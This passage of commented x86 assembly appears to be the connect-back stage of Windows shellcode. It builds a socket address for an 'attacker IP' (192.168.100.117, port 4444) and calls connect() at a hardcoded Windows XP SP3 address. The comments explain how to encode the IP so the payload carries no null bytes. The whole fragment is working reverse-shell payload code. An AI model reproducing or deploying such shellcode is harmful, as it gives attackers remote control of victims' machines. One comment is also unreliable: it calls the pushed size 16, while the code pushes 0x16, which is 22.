mov ebx,0xCAB9FE15      ; Push attacker IP: 192.168.100.117. In reverse order:
                        ; hex(117) = 0x75
                        ; hex(100) = 0x64
                        ; hex(168) = 0xa8
                        ; hex(192) = 0xc0
                        ; 0x7564a8c0 + 0x55555555 = 0xCAB9FE15
sub ebx,0x55555555      ; Substract again 55555555 to get the original IP
push ebx                ; This will push 0x7564a8c0 to the stack without injecting NULL bytes, if any
push word 0x5c11        ; Push port: hex(4444) = 0x115c
xor ebx,ebx             ; Zero out EBX
add bl,0x2              ; sa_family: AF_INET = 2
push word bx            ; Push sa_family parameter
mov ebx,esp             ; EBX now has the pointer to sockaddr structure
push byte 0x16             ; Size of sockaddr: sa_family + sa_data = 16
push ebx                ; Push pointer ('name' parameter)
push esi                ; Push saved socket handler ('s' parameter)
mov ebx,0x71ab4a07      ; Address of connect() on WinXPSP3
call ebx                ; Call connect()
